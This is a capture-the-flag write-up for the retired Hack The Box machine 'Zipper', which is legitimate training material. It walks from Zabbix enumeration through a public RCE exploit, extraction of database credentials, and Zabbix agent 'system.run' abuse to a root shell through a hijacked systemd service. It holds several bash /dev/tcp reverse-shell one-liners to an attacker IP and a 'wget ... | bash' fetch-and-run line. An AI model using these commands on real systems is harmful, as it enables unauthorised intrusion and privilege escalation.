# Zipper

This is the write-up for the box Zipper that got retired at the 23rd February 2019.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.108    zipper.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/zipper.nmap 10.10.10.108
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page shows the Apache2 Ubuntu default page, so lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u 10.10.10.108 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds _/zabbix_ that forwards to the login page of the open-source monitoring system **Zabbix**:

![Zabbix login](https://kyuu-ji.github.io/htb-write-up/zipper/zipper_web-1.png)

There is an option to _sign in as guest_ to get some restricted access to the platform.
The footer shows that it is running **Zabbix version 3.0.21** and on _Latest data_ it shows the checks it is doing on the devices and there are potential hostnames and usernames:

![Zabbix latest data](https://kyuu-ji.github.io/htb-write-up/zipper/zipper_web-2.png)

When trying to log in with _zipper:zipper, zabbix:zabbix, zapper:zapper_ only the _zapper_ user gives a different message:

> "GUI access diabled"

It seems like that those are valid credentials, but they don't log in yet.

Searching for known vulnerabilities:
```markdown
searchsploit zabbix
```
```markdown
Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution
```

Even though the version is lower than the running version, this vulnerability could still work.
Modifying the script to our needs:
```python
# (...)
ZABIX_ROOT = 'http://10.10.10.108/zabbix'      ### Zabbix IP-address

login = 'zapper'                ### Zabbix login
password = 'zapper'     ### Zabbix password
hostid = '10105'        ### Zabbix hostid
# (...)
```

The _hostid_ can be found by running one of the scripts and it gets shown in the URL of the results:

![Zabbix getting HostID](https://kyuu-ji.github.io/htb-write-up/zipper/zipper_web-3.png)

Running the exploit:
```markdown
python 39937.py
```

After running the script, it starts a command line where it is possible to execute commands:
- `hostname`: _"25eb6425705c"_
- `ifconfig`: _172.17.0.2_
- `whoami`: _zabbix_

We can start a persistent shell, to navigate the system more comfortably:
```markdown
bash -c 'bash -i  >& /dev/tcp/10.10.14.14/9001 0>&1'
```

### Enumerating the Zabbix server

Right now this is access to the Zabbix server, but our goal is to get into the _zipper_ box.

The database information of **Zabbix** can be found in _/etc/zabbix/zabbix_server.conf_ and in there are credentials for the database:
```markdown
DBName=zabbixdb
DBUser=zabbix
DBPassword=f.YMeMd$pTbpY3-449
```

Starting real terminal:
```markdown
script -q /dev/null
```

Logging into the MySQL database:
```markdown
mysql -u zabbix -D zabbixdb -p
```

Looking for the user database end getting the contents:
```markdown
show databases;
use zabbixd;

show tables;
describe users;

select userid, alias, passwd from users;
```

There are 3 users and the passwords are 32-character hashes which is probably **MD5**:
```markdown
+--------+--------+----------------------------------+
| userid | alias  | passwd                           |
+--------+--------+----------------------------------+
|      1 | Admin  | 65e730e044402ef2e2f386a18ec03c72 |
|      2 | guest  | d41d8cd98f00b204e9800998ecf8427e |
|      3 | zapper | 16a7af0e14037b567d7782c4ef1bdeda |
+--------+--------+----------------------------------+
```

When encoding the password for the database it is the same MD5 hash as this _Admin_ password.
```markdown
echo -n 'f.YMeMd$pTbpY3-449' | md5sum
```

Which means, that the credentials for the Zabbix admin interface is the username _Admin_ and the password _"f.YMeMd$pTbpY3-449"_.

### Exploiting Zabbix to access Zipper

On the admin interface it is possible to see the enabled services for the clients and it looks like our target _zipper_ has the **Zabbix Agent** installed:

![Enabled services](https://kyuu-ji.github.io/htb-write-up/zipper/zipper_web-4.png)

By default this service listens on port 10050 or 10051, so lets test for the ports from the _zabbix_ server:
```markdown
bash -c 'echo 1> /dev/tcp/172.17.0.1/10050 && echo open || echo false'
open

bash -c 'echo 1> /dev/tcp/172.17.0.1/10051 && echo open || echo false'
bash: connect: Connection refused
bash: /dev/tcp/172.17.0.1/10051: Connection refused
false
```

Port 10050 is open and by using the [Zabbix Agent API](https://www.zabbix.com/documentation/3.4/manual/config/items/itemtypes/zabbix_agent) it is possible to send commands to the service:
```markdown
echo "agent.hostname" | nc 172.17.0.1 10050
```
```markdown
Zipper
```

The command _agent.hostname_ shows the hostname of the server with the **Zabbix Agent** installed. There is another command called _system.run_ with which commands can be sent to the client if the agent configuration has _"EnableRemoteCommands"_ enabled:
```markdown
echo "system.run[ping -c 1 10.10.14.14]" | nc 172.17.0.1 10050
```

After sending this and by listening to incoming ICMP traffic, it sends a `ping` response back from the _zipper_ client and thus command execution is successful.

Trying to start a reverse shell:
```markdown
echo "system.run[bash -c 'bash -i >& /dev/tcp/10.10.14.14/9002 0>&1']" | nc 172.17.0.1 10050
```

The reverse shell session starts but exits seconds later, because **Zabbix Agent** runs the command and waits for around three seconds until it kills the connection.
This can be bypassed by using `nohup` and `&` to background the process:
```markdown
echo "system.run[bash -c 'nohup bash -i >& /dev/tcp/10.10.14.14/9002 0>&1 &']" | nc 172.17.0.1 10050
```

After sending the command, the listener on my IP and port 9002 starts a reverse shell on the box _zipper_ as the user _zabbix_.

## Privilege Escalation

There is one home directory of _zapper_ in which everyone has read access.
The file _/home/zapper/utils/backup.sh_ has the following content:
```markdown
# Quick script to backup all utilities in this folder to /backups

/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

One of the parameters looks like a password and when switching users to _zapper_ via `su zapper`, the password _"ZippityDoDah"_ works and privileges got escalated to that user.

### Privilege Escalation to root

To get an attack surface, it is recommended to run any **Linux Enumeration script**:
```markdown
wget 10.10.14.14/LinEnum.sh | bash
```

The file _/home/zapper/utils/zabbix-service_ has the **SetUID bit** set and the user _zapper_ has write permissions to a **systemd timer**.
This configuration file is in _/etc/systemd/system/purge-backups.service_ and by changing the _ExecStart_ parameter to a executable that is controlled by us, we are able to run any code.

Inserting command in _/etc/systemd/system/purge-backups.service_:
```markdown
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/tmp/shell.sh
[Install]
WantedBy=purge-backups.timer
```

Creating _/tmp/shell.sh_:
```markdown
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.14/9003 0>&1
```

Executing _zabbix-service_ and stopping and starting the service:
```markdown
./zabbix-service
start or stop?: stop

./zabbix-service
start or stop?: start
```

After executing, the listener on my IP and port 9003 will start a shell as root!
